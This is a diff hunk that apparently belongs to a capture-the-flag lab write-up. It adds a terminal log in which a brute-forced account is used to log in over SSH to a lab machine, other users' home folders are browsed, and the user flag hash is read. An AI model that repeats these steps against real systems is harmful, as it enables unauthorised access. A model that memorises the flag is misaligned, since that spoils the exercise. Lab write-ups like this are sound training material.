@@ -94,6 +94,57 @@ Hydra (http://www.thc.org/thc-hydra) starting at 2024-10-30 03:56:43
 Hydra (http://www.thc.org/thc-hydra) finished at 2024-10-30 03:57:06
 </code></pre>
 
+<pre><code>
+$ ssh jake@10.10.250.221
+The authenticity of host '10.10.250.221 (10.10.250.221)' can't be established.
+ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.250.221' (ECDSA) to the list of known hosts.
+jake@10.10.250.221's password: 
+Last login: Tue May 26 08:56:58 2020
+jake@brookly_nine_nine:~$ s -la
+total 44
+drwxr-xr-x 6 jake jake 4096 May 26  2020 .
+drwxr-xr-x 5 root root 4096 May 18  2020 ..
+-rw------- 1 root root 1349 May 26  2020 .bash_history
+-rw-r--r-- 1 jake jake  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 jake jake 3771 Apr  4  2018 .bashrc
+drwx------ 2 jake jake 4096 May 17  2020 .cache
+drwx------ 3 jake jake 4096 May 17  2020 .gnupg
+-rw------- 1 root root   67 May 26  2020 .lesshst
+drwxrwxr-x 3 jake jake 4096 May 26  2020 .local
+-rw-r--r-- 1 jake jake  807 Apr  4  2018 .profile
+drwx------ 2 jake jake 4096 May 18  2020 .ssh
+-rw-r--r-- 1 jake jake    0 May 17  2020 .sudo_as_admin_successful
+jake@brookly_nine_nine:~$ pwd
+/home/jake
+jake@brookly_nine_nine:~$ cd ..
+jake@brookly_nine_nine:/home$ ls -la
+total 20
+drwxr-xr-x  5 root root 4096 May 18  2020 .
+drwxr-xr-x 24 root root 4096 May 19  2020 ..
+drwxr-xr-x  5 amy  amy  4096 May 18  2020 amy
+drwxr-xr-x  6 holt holt 4096 May 26  2020 holt
+drwxr-xr-x  6 jake jake 4096 May 26  2020 jake
+jake@brookly_nine_nine:/home$ cd holt
+jake@brookly_nine_nine:/home/holt$ ls -la
+total 48
+drwxr-xr-x 6 holt holt 4096 May 26  2020 .
+drwxr-xr-x 5 root root 4096 May 18  2020 ..
+-rw------- 1 holt holt   18 May 26  2020 .bash_history
+-rw-r--r-- 1 holt holt  220 May 17  2020 .bash_logout
+-rw-r--r-- 1 holt holt 3771 May 17  2020 .bashrc
+drwx------ 2 holt holt 4096 May 18  2020 .cache
+drwx------ 3 holt holt 4096 May 18  2020 .gnupg
+drwxrwxr-x 3 holt holt 4096 May 17  2020 .local
+-rw-r--r-- 1 holt holt  807 May 17  2020 .profile
+drwx------ 2 holt holt 4096 May 18  2020 .ssh
+-rw------- 1 root root  110 May 18  2020 nano.save
+-rw-rw-r-- 1 holt holt   33 May 17  2020 user.txt
+jake@brookly_nine_nine:/home/holt$ cat user.txt
+ee11cbb19052e40b07aac0ca060c23ee
+</code></pre>
+
 
 
 
